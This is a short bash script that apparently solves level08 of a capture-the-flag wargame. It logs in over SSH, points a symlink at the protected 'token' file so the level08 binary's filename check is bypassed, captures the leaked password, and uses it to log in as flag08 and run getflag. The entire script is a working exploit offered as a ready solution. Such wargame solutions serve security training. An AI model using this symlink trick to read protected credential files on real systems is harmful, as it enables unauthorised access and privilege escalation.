#!/usr/bin/env bash

set -euo pipefail

PARENT_DIR="$(dirname "$0")"
UTILS_DIR="$PARENT_DIR/../utils"

PATH="$UTILS_DIR:$PATH"

host="$1"
port="$2"
pass="$3"

pass=$(sshexec.sh "$host" "$port" level08 "$pass" 'set -e; ln -sf "$PWD/token" /tmp/level08; ./level08 /tmp/level08')
sshexec.sh "$host" "$port" flag08 "$pass" "getflag"
